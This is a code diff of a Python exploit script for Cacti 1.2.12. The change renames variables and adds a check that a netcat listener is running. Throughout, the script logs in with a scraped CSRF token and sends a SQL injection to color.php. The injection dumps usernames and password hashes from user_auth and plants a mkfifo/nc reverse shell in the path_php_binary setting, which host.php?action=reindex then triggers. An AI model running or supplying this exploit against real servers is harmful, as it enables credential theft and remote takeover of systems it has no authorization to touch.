@@ -3,75 +3,78 @@ import requests
 import re
 import time
 
-def string_fix(url1):
-    if url1[-1] == "/": 
-        url1 = url1.rstrip(url1[-1]) 
-        return url1
+def string_fix(url):
+    if url[-1] == "/": 
+        fixed_url = url.rstrip(url[-1])
+        return fixed_url
     else:
-        return url1
+        return url
 
+def nccheck(url,username,password,lhost,lport):
+    while True:
+        nc_check = input("Is netcat running? y or n? ")
+        if nc_check == 'y':
+            sql_exploit(url,username,password,lhost,lport)
+        elif nc_check == 'n':
+            print("Make sure netcat is running with nc -lvnp " + lport)
+            exit()
+        else:
+            continue
 
-def sql_exploit(url1,username,password,lhost,lport):
-    print("Make sure netcat is listening!")
-    time.sleep(1)
-
-    url2 = url1 + '/cacti/index.php'
+def sql_exploit(url,username,password,lhost,lport):
+    login_url = url + '/cacti/index.php'
 
     print("Getting the csrf token!")
     time.sleep(1)
 
-    s = requests.Session() 
-    r1 = s.get(url2)
-    csrf = r1.text 
-
-    csrf = re.findall("name='__csrf_magic' value=(.*) />",csrf) 
-    f_csrf = ''
-
-    for i in csrf:
-        for j in i:
-            if j == ';':
-                break
-            else:
-                f_csrf = f_csrf + j
+    session = requests.Session()
+    csrf_url_req = session.get(login_url)
     
-    f_csrf = f_csrf.replace('"','') 
-    print("The csrf is token is: " + f_csrf)
+    csrf = re.findall("srfMagicToken = \"(.*);ip",csrf_url_req.text)
+    
+    print("The csrf is token is: " + csrf[0])
     time.sleep(1)
 
-    data = {'__csrf_magic':f_csrf,'action':'login','login_username':username,'login_password':password}
+    data = {'__csrf_magic':csrf[0],'action':'login','login_username':username,'login_password':password}
 
     print("Logging in")
     time.sleep(1)
-    r2 = s.post(url2,data=data) 
+    login_req = session.post(login_url,data=data)
 
     print("Sending payload")
     time.sleep(1)
-    url3 = url1 + "/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+"+lhost+"+"+lport+"+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-"
-    r3 = s.get(url3)
+    sql_inj_url = url + "/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+"+lhost+"+"+lport+"+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-"
+    sql_inj_req = session.get(sql_inj_url)
 
-    url4 = url1 + "/cacti/host.php?action=reindex"
-    r4 = s.get(url4)
+    payload_execute_url = url + "/cacti/host.php?action=reindex"
+    payload_execute_req = session.get(payload_execute_url)
 
 
 
 def main():
-    parser = argparse.ArgumentParser(description='Cacti 1.2.12 - SQL Injection / Authenticated Remote Code Execution') 
+    parser = argparse.ArgumentParser(description='Cacti 1.2.12 - SQL Injection / Authenticated Remote Code Execution')
 
-    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, Example: -t http://exploitcacti.com', required=True) 
-    parser.add_argument('-u', metavar='<user>', help='Example: -u admin', required=True)
-    parser.add_argument('-p', metavar='<password>', help="Example: -p password", required=True)
-    parser.add_argument('--lhost', metavar='<lhost>', help='Example: --lhost 127.0.0.1', required=True)
-    parser.add_argument('--lport', metavar='<lport>', help='Example: --lport 9001', required=True)
+    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: http://exploitcacti.com', required=True)
+    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
+    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
+    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=True)
+    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=True)
     args = parser.parse_args()
 
-    url1 = args.t
+    url = args.t
     username = args.u
     password = args.p
     lhost = args.lhost
     lport = args.lport
 
-    url1 = string_fix(url1)
-    sql_exploit(url1,username,password,lhost,lport)
+    url = string_fix(url)
+
+    while True:
+        try:
+            nccheck(url,username,password,lhost,lport)
+        except KeyboardInterrupt:
+            print("Bye Bye!")
+            exit()
 
 if __name__ == "__main__":
     main()
